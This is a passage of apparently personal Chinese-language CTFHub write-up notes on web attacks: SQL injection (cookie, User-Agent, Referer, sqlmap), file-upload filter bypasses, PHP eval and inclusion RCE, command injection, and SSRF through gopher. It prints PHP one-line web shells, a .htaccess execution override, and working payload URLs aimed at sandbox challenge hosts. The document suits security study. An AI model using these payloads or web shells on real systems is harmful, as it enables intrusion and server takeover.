<h4 id="手工查询当前库名称-1">手工查询当前库名称</h4>
<p><code>0' union select 1,database() #</code>那么在前面“2”的位置就会输出当前的数据库名称（database()仅限MySQL）</p>
<h3 id="cookie注入">Cookie注入</h3>
<h4 id="手工注入">手工注入</h4>
<p>使用BurpSuite，找到第二次及以后访问时request中cookie的位置，之后可以在cookie中修改sql语句进行手工注入。当然，如果输出发现是字符型、布尔型或没有输出，则需要对应的方法。</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115110525214.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115110525214.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115110525214.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115110525214.png 2x"
    data-sizes="auto"
    alt="image-20230115110525214"
    title="image-20230115110525214"/></p>
<h4 id="使用工具">使用工具</h4>
<p>先使用BurpSuite得到一个样例request，然后将request存在linux虚拟机的一个文件中，例如“1”</p>
<p>使用sqlmap的request功能：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="m">1</span> --level <span class="m">2</span>
</span></span></code></pre></div><p>此处level后面的值决定探测注入点方式多少，其中cookie在2级及以上被探测。具体每个级别探测的内容用搜索引擎找。</p>
<p>发现注入点之后，即可使用与之前类似的方法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="m">1</span> --current-db
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h3 id="ua注入">UA注入</h3>
<p>手工注入同cookie注入，即把cookie的注入点换成在User Agent处</p>
<h4 id="使用工具-1">使用工具</h4>
<p>如果直接用&ndash;level n来尝试找注入点，会返回</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>CRITICAL<span class="o">]</span> specified file <span class="s1">&#39;1&#39;</span> does not contain a usable HTTP request <span class="o">(</span>with parameters<span class="o">)</span>
</span></span></code></pre></div><p>需要手动标记注入点，在“1”文件的User Agent:1后面加“*”</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114029899.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114029899.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114029899.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114029899.png 2x"
    data-sizes="auto"
    alt="image-20230115114029899"
    title="image-20230115114029899"/></p>
<p>然后再</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -r <span class="m">1</span>
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h3 id="refer注入">Refer注入</h3>
<p>和UA唯一的区别，就是在生成的样例request中并没有referer语句，所以手动加上：</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114730344.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114730344.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114730344.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115114730344.png 2x"
    data-sizes="auto"
    alt="image-20230115114730344"
    title="image-20230115114730344"/></p>
<p>后同UA注入</p>
<h3 id="过滤空格">过滤空格</h3>
<p>有时网站会通过禁止带空格字符串的输入来达到一定的安全目的，但是实际上只要把输入的空格替换成<code>/**/</code>就可以了。非常简单，甚至好像有点傻。</p>
<h2 id="文件上传">文件上传</h2>
<h3 id="无验证">无验证</h3>
<p>可以用蚁剑，使用shell工具访问木马：<a href="https://writeup.ctfhub.com/Skill/Web/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0/wjpyN7SCVfwf7k2Nq9Q7Gn.html"target="_blank" rel="external nofollow noopener noreferrer">本题WriteUp<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p>应用更广泛的小马：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ddf&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>但是也可以直接用web shell，将一句话木马写成：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ddf&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>将php文件上传，然后访问该文件，在文件后加上<code>?ddf=shell指令</code>即可在网页目录中进行操作。依次访问：</p>
<pre tabindex="0"><code>http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=ls -a //不在当前目录下
http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=pwd //查看当前目录
返回：/var/www/html/upload/ 之后查看html文件夹
http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=ls /var/www/html
发现有flag文件，直接访问没有内容，考虑用cat查看文件
http://challenge-d97d326c6a3bb91a.sandbox.ctfhub.com:10800/upload/a.php?ddf=cat%20/var/www/html/flag_1492117286.php
再查看该网页源代码得到flag
</code></pre><h3 id="前端验证">前端验证</h3>
<p>网页通过javascript只允许白名单内的文件上传，可以通过在执行js代码时设置断点，在判断文件类型前改掉上传的文件类型绕过检测。</p>
<ol>
<li>在F12→源代码中，找到判断文件类型的函数，在函数中判断语句前设置断点。</li>
<li>执行上传操作，然后在右侧改掉参数，将<code>a.php</code>改为<code>a.jpg</code>（根据白名单而定），再继续执行上传，即可完成</li>
<li>后续和无验证的操作相同</li>
</ol>
<h3 id="mime验证">MIME验证</h3>
<p>MIME，多用途互联网邮件扩展，服务端检测上传文件是否为MIME类型。</p>
<p>只需先上传一遍木马文件，然后上传一遍MIME中的文件（如png），从Request中得到一种允许的文件类型：</p>
<pre tabindex="0"><code>Content-Type: image/png
</code></pre><p>于是用image/png替换木马文件上传时的Content-Type，使用Repeater发送一下Request就可以完成上传了。</p>
<p>之后的操作和无验证相同</p>
<h3 id="文件头验证">文件头验证</h3>
<p>网页通过检查文件开头的内容来判断是否为合法文件</p>
<p>可能的方法：将png图片的头部拷贝到木马的前面；将木马拷贝到png的后面。</p>
<h4 id="在木马前添加合法头部">在木马前添加合法头部</h4>
<p>由于png的头部是一些奇怪的代码，拷贝后显示文件错误无法上传。不知道有没有办法能正常拷贝</p>
<h4 id="将木马放在png后面">将木马放在png后面</h4>
<p>选用一个小png，防止过多乱码中出现一小段编译错误的php代码。在最后插入一句话木马。</p>
<p>然后该掉文件名，使其后缀为php，重新上传。</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230118221715778.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230118221715778.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230118221715778.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230118221715778.png 2x"
    data-sizes="auto"
    alt="image-20230118221715778"
    title="image-20230118221715778"/></p>
<p>上传成功，后续操作同上。</p>
<h3 id="00截断">00截断</h3>
<p>先上传一个php，发现并不信；上传一个png，发现也没法访问。也就是并不能直接访问上传的文件。</p>
<p>将php上传的request发送到repeater，修改filename和存储路径：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?road=/var/www/html/upload/1.php%00/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Disposition</span><span class="o">:</span> <span class="l">form-data; name=&#34;file&#34;; filename=&#34;a.jpg&#34;</span>
</span></span></code></pre></div><p><code>%00</code>相当于C++中的<code>\0</code>，即标记了字符串的结尾。文件的存储路径是<code>/var/www/html/upload/1.php%00/a.jpg</code>，但是由于<code>%00</code>处就结束了，所以文件内容被写入了<code>/var/www/html/upload/1.php</code>。</p>
<p>再访问<code>...:10800/upload/1.php?...</code>即可。此内容有点抽象，希望之后的我还能记得现在的我是怎么理解的。</p>
<h3 id="双写后缀">双写后缀</h3>
<p>上传php文件，发现上传成功，但是文件名从<code>a.php</code>变成了<code>a.</code>，说明网页会过滤掉php后缀使之无法执行。</p>
<p>但是，网页比较傻，只遍历一次字符串。那就把文件名改成<code>a.pphphp</code>，就结束了</p>
<h3 id="htaccess">.htaccess</h3>
<p>.htaccess是服务器的一个配置文件，可以实现让某种后缀名的文件在执行时当做另一个后缀名。</p>
<p>上传写有如下内容的.htaccess文件：</p>
<pre tabindex="0"><code class="language-htaccess" data-lang="htaccess">&lt;FilesMatch &#34;1.jpg&#34;&gt;
 SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><p>再上传内容是一句话木马的1.jpg文件，即可用<code>upload/1.jpg?</code>之类的东西搞flag了。</p>
<h2 id="rce">RCE</h2>
<h3 id="eval执行">eval执行</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>网页提示当参数是cmd时，执行cmd后的php代码。可以用以下方法运行系统命令：</p>
<pre tabindex="0"><code>http://challenge-cff24276e86e09e4.sandbox.ctfhub.com:10800/?cmd=system(&#39;系统命令&#39;);
</code></pre><ul>
<li>
<p>find命令</p>
<p>shell的find命令：<code>find [文件夹] -name [带通配符的文件名]</code>，即可找到在文件夹下的某种名字的文件，对找CTFHub的flag非常有用。</p>
</li>
</ul>
<h3 id="文件包含">文件包含</h3>
<p>网页代码：</p>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;file&#39;])){
    if(!strpos(&amp;_GET[&#34;file&#34;],&#34;flag&#34;)){
        inclulde $_GET[&#34;file&#34;];
    }
    else{
        echo &#34;Hacker!!!&#34;;
    }
}
else{
    highlight_file(__FILE__);
}
?&gt;
&lt;hr&gt;
i have a &lt;a href=&#34;shell.txt&#34;&gt;shell&lt;/a&gt;, how to use it ?
</code></pre><p>即：如果有参数file，且file=后面没有flag子串，那么就把file后的文件放进来。</p>
<p>注意到，shell.txt是个一句话木马，于是使用file参数include这个木马文件，然后另用木马中给出的ctfhub参数执行小马可用的所有指令。即：</p>
<pre tabindex="0"><code>...10800/?file=shell.txt&amp;ctfhub=system(&#39;ls /&#39;)
</code></pre><p>后略。</p>
<h3 id="phpinput">php://input</h3>
<p>网页题干：</p>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
if (isset($_GET[&#39;file&#39;])) {
    if ( substr($_GET[&#34;file&#34;], 0, 6) === &#34;php://&#34; ) {
        include($_GET[&#34;file&#34;]);
    } else {
        echo &#34;Hacker!!!&#34;;
    }
} else {
    highlight_file(__FILE__);
}
?&gt;
&lt;hr&gt;
i don&#39;t have shell, how to get flag? &lt;br&gt;
&lt;a href=&#34;phpinfo.php&#34;&gt;phpinfo&lt;/a&gt;
</code></pre><p>当文件名开头是<code>php://</code>时，就会把文件include进来</p>
<p><code>php://input</code>是一种特殊文件名，可以包含request中的内容。所以使用burp，修改request如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?file=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">challenge-d0f4685c0c27baca.sandbox.ctfhub.com:10800</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">&lt;?PHP system(&#39;cat /flag_8157&#39;)?&gt;
</span></span></span></code></pre></div><p>第一行改为post，并把网址换为<code>/?file=php://input</code>，那么input文件内容即为<code>&lt;?PHP system('cat /flag_8157')?&gt;</code></p>
<p>以上是最后一步，反正只要改system函数里面的内容就行了，此部分略。</p>
<h3 id="读取源代码">读取源代码</h3>
<p>原题：</p>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
error_reporting(E_ALL);
if (isset($_GET[&#39;file&#39;])) {
    if ( substr($_GET[&#34;file&#34;], 0, 6) === &#34;php://&#34; ) {
        include($_GET[&#34;file&#34;]);
    } else {
        echo &#34;Hacker!!!&#34;;
    }
} else {
    highlight_file(__FILE__);
}
?&gt;
&lt;hr&gt;
i don&#39;t have shell, how to get flag? &lt;br&gt;
flag in &lt;code&gt;/flag&lt;/code&gt;
</code></pre><p>由于给出了flag的位置，通过<code>php://filter</code>来获取文件源码：</p>
<pre tabindex="0"><code>http://challenge-5b3cb60f241900c2.sandbox.ctfhub.com:10800/?file=php://filter/resource=/flag
</code></pre><p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230123131234157.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230123131234157.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230123131234157.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230123131234157.png 2x"
    data-sizes="auto"
    alt="image-20230123131234157"
    title="image-20230123131234157"/></p>
<p>输出如图。</p>
<h3 id="远程包含">远程包含</h3>
<p>同input，没有任何实际区别。</p>
<h3 id="命令注入">命令注入</h3>
<p><code>|</code> <code>&amp;</code> <code>;</code>可以作为命令注入的媒介。在网站可以输入某个指令时，在指令后加上这三个中的一个，即可在其后面注入想要的命令。<code>|</code>可以把前面的作为后面的输入（前提是前者可以作为后者的输入）；<code>&amp;</code>则是在前者可以执行的情况下再执行后（C++期末考的傻逼教训）；<code>;</code>就是顺序执行两个命令。</p>
<p>如本题给了一个ping某个ip的输入框，那就在IP处输入：</p>
<pre tabindex="0"><code>andreoy.cn | ls
</code></pre><p>那就执行ls。后略。</p>
<h3 id="过滤cat">过滤cat</h3>
<p>就用grep。前面也用到过。前面那个更牛逼（）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ grep <span class="o">[</span>要查找的字符串<span class="o">]</span> <span class="o">[</span>文件名<span class="o">]</span>
</span></span></code></pre></div><p>返回该文件中该字符串所在的一行。</p>
<h3 id="过滤空格-1">过滤空格</h3>
<p>用tab替代空格。即使用<code>%09</code>输入tab。不能在输入框直接输入，但是可以在网址栏或者Burp的request中输入。</p>
<h3 id="综合过滤练习">综合过滤练习</h3>
<p>过滤了<code>|</code> <code>&amp;</code> <code>;</code>，那就用换行（\n)。即<code>%0a</code></p>
<p>grep在这里好像有点无敌（</p>
<h2 id="ssrf">SSRF</h2>
<h3 id="内网访问">内网访问</h3>
<p>如果有url参数，在url中输入内网ip即可访问该地址。</p>
<h3 id="伪协议读取文件">伪协议读取文件</h3>
<p>同样是url参数内容：</p>
<pre tabindex="0"><code>url=file://[文件绝对路径]
</code></pre><p>即可访问文件。记得如果有根目录的话开头会有三个斜杠</p>
<h3 id="端口扫描">端口扫描</h3>
<p>用burp扫描端口，本题默认本地文件，则<code>url=127.0.0.1:[端口]</code></p>
<h3 id="post请求">POST请求</h3>
<ul>
<li>index.php源码</li>
</ul>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php

error_reporting(0);

if (!isset($_REQUEST[&#39;url&#39;])){
    header(&#34;Location: /?url=_&#34;);
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
</code></pre><ul>
<li>flag.php源码</li>
</ul>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php

error_reporting(0);

if ($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;) {
    echo &#34;Just View From 127.0.0.1&#34;;
    return;
}

$flag=getenv(&#34;CTFHUB&#34;);
$key = md5($flag);

if (isset($_POST[&#34;key&#34;]) &amp;&amp; $_POST[&#34;key&#34;] == $key) {
    echo $flag;
    exit;
}
?&gt;

&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
&lt;input type=&#34;text&#34; name=&#34;key&#34;&gt;
&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;
&lt;/form&gt;
</code></pre><p>首先按源码里说的，从<code>url=127.0.0.1/flag.php</code>获得MD5加密后的key。这个key是无法直接上传的，但是可以制作一个POST请求，然后用curl支持的gopher协议上传。</p>
<p>使用浏览器的F12做一个上传按钮，生成一个上传的request，send to repeater</p>
<p>删去一些不必要的参数，修改host为本地127.0.0.1，完整内容如下。留下的三个参数是不可或缺的三个POST所需参数。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">36</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">key=0db803a4686b5601be58786ade871dc9
</span></span></code></pre></div><p>index.php会进行一次解码，flag.php会进行一次解码，所以要encode两次，把百分号再encode成%25，如下。用burp弄即可。先convert all characters，再convert key characters。</p>
<pre tabindex="0"><code>%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%250d%250a%256b%2565%2579%253d%2530%2564%2562%2538%2530%2533%2561%2534%2536%2538%2536%2562%2535%2536%2530%2531%2562%2565%2535%2538%2537%2538%2536%2561%2564%2565%2538%2537%2531%2564%2563%2539
</code></pre><p>访问即可得到flag</p>
<pre tabindex="0"><code>challenge-3925d6875a1425bd.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%250d%250a%256b%2565%2579%253d%2530%2564%2562%2538%2530%2533%2561%2534%2536%2538%2536%2562%2535%2536%2530%2531%2562%2565%2535%2538%2537%2538%2536%2561%2564%2565%2538%2537%2531%2564%2563%2539
</code></pre><p>其中80是必须加的，因为gopher协议的默认端口并不是80。</p>
<h3 id="上传文件">上传文件</h3>
<ul>
<li>flag.php源码</li>
</ul>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php

error_reporting(0);

if($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;){
    echo &#34;Just View From 127.0.0.1&#34;;
    return;
}

if(isset($_FILES[&#34;file&#34;]) &amp;&amp; $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0){
    echo getenv(&#34;CTFHUB&#34;);
    exit;
}
?&gt;

Upload Webshell

&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
    &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
&lt;/form&gt;
</code></pre><p>上题中添加按钮上传一步，可以改为控制台的命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">f</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">()</span>
</span></span></code></pre></div><p>后面和上一题处理基本相同，就是把密钥改成上传一个文件即可。</p>
<h3 id="fastcgi协议">FastCGI协议</h3>
<a href="https://github.com/tarunkant/Gopherus" title="gopherus"target="_blank" rel="external nofollow noopener noreferrer" class="card-link"><span class="cl-backdrop" style="--cl-bg-url: url(/fixit.min.svg);"></span>
    <span class="cl-content">
      <span class="cl-text">
        <span class="cl-title">Gopher协议工具</span>
        <span class="cl-meta">
          <svg class="cl-icon-link" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M574 665.4c-3.1-3.1-8.2-3.1-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8c-3.1-3.1-8.2-3.1-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zM832.6 191.4c-84.6-84.6-221.5-84.6-306 0L410.3 307.6c-3.1 3.1-3.1 8.2 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6c-3.1 3.1-3.1 8.2 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1z" fill="#a9a9b3"></path><path d="M610.1 372.3c-3.1-3.1-8.2-3.1-11.3 0L372.3 598.7c-3.1 3.1-3.1 8.2 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z" fill="#a9a9b3"></path></svg>
          <span class="cl-url">https://github.com/tarunkant/Gopherus</span>
        </span>
      </span><svg class="cl-icon-globe" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M960 512c0 249.408-203.2 448-448 448-244.778667 0-448-198.592-448-448S262.592 64 512 64s448 198.592 448 448" fill="#2196F3"></path><path d="M507.52 718.08c0-8.96-4.48-13.44-13.44-17.92-26.88-8.96-53.76-8.96-76.16-31.381333-4.48-8.96-4.48-17.92-8.96-26.88-8.96-8.96-31.36-13.44-44.8-17.92h-89.6c-13.44-4.48-22.4-22.4-31.36-35.84 0-4.48 0-13.461333-8.96-13.461334-8.96-4.458667-17.92 4.501333-26.88 0-4.48-4.458667-4.48-8.96-4.48-13.418666 0-13.461333 8.96-26.901333 17.92-35.861334 13.44-8.96 26.88 4.48 40.32 4.48 4.48 0 4.48 0 8.96 4.48 13.44 4.48 17.92 22.4 17.92 35.861334v8.96c0 4.48 4.48 4.48 8.96 4.48 4.48-22.4 4.48-44.821333 8.96-67.2 0-26.88 26.88-53.781333 49.28-62.72 8.96-4.458667 13.44 4.501333 22.4 0 26.88-8.96 94.08-35.84 80.64-71.658667-8.96-31.381333-35.84-62.698667-71.68-58.24-8.96 4.501333-13.44 8.96-22.4 13.461333-13.44 8.96-40.32 35.84-53.76 35.84-22.4-4.48-22.4-35.84-17.92-49.301333 4.48-17.92 44.8-76.138667 71.68-67.178667l17.92 17.92c8.96 4.48 22.4 4.48 35.84 4.48 4.48 0 8.96 0 13.44-4.48 4.48-4.48 4.48-4.48 4.48-8.96 0-13.44-13.44-26.901333-22.4-35.861333s-22.4-17.92-35.84-22.378667c-44.8-13.461333-116.48 4.458667-152.32 35.84-35.84 31.36-62.72 85.12-80.64 129.92-8.96 26.88-17.92 62.698667-22.4 94.08-4.48 22.4-8.96 40.32 4.48 62.698667 13.44 26.88 40.32 53.781333 67.2 71.68 17.92 13.44 53.76 13.44 71.68 35.84 13.44 17.941333 8.96 40.32 8.96 62.72 0 26.88 17.92 49.28 26.88 71.658667 4.48 13.461333 8.96 31.381333 13.44 44.821333 0 4.48 4.48 31.36 4.48 35.84 26.88 13.44 49.28 26.901333 80.64 35.861333 4.48 0 22.4-26.901333 22.4-31.381333 13.44-13.44 22.4-31.36 35.84-40.32 8.96-4.48 17.92-8.96 26.88-17.941333 8.96-8.96 13.44-26.88 17.92-40.32 4.48-8.938667 8.96-26.858667 4.48-40.298667M516.48 305.92c4.48 0 8.96-4.48 17.92-8.96 13.44-8.96 26.901333-22.4 40.32-31.36 13.461333-8.96 26.901333-22.4 35.861333-31.36 13.44-8.96 22.4-26.88 26.88-40.341333 4.48-8.96 17.941333-26.88 13.44-40.32-4.48-8.96-26.88-13.44-35.84-17.92C579.2 126.698667 547.84 122.24 512 122.24c-13.44 0-31.36 4.458667-35.84 17.92-4.48 22.4 13.44 17.92 31.36 22.4 0 0 4.48 35.84 4.48 40.32 4.48 22.421333-8.96 35.84-8.96 58.24 0 13.44 0 35.84 8.96 44.8h4.48zM892.8 619.52c4.501333-8.96 4.501333-22.4 8.96-31.36 4.501333-22.421333 4.501333-44.8 4.501333-67.2 0-44.8-4.501333-89.578667-17.92-129.92-8.96-13.44-13.461333-26.88-17.941333-40.341333-8.96-22.378667-22.4-44.8-40.32-62.698667-17.92-22.4-40.341333-85.12-80.64-67.2-13.44 4.501333-22.4 22.421333-31.36 31.381333l-26.88 40.32c-4.501333 4.48-8.96 13.44-4.501333 17.92 0 4.48 4.501333 4.48 8.96 4.48 8.96 4.501333 13.461333 4.501333 22.421333 8.96 4.48 0 8.96 4.501333 4.48 8.96 0 0 0 4.501333-4.48 4.501334-22.421333 22.4-44.8 40.32-67.2 62.698666-4.48 4.48-8.96 13.44-8.96 17.92s4.48 4.48 4.48 8.96c0 4.501333-4.48 4.501333-8.96 8.96-8.96 4.501333-17.92 8.96-22.4 13.461334-4.48 8.96 0 22.4-4.48 31.36-4.48 22.4-17.941333 